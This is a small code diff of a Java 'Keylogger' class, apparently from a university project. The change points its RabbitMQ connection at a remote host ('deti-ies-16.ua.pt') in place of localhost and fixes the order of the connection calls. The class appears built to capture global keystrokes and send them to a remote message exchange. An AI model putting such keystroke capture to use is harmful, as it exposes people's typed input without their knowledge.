@@ -21,8 +21,8 @@ public class Keylogger implements NativeKeyListener{
   public Keylogger(Long id) throws Exception{
     this.id = id;
     ConnectionFactory factory = new ConnectionFactory();
+    factory.setHost("deti-ies-16.ua.pt");
     Connection connection = factory.newConnection();
-    factory.setHost("localhost");
     channel = connection.createChannel();
     channel.exchangeDeclare(EXCHANGE_NAME, "fanout");
   }
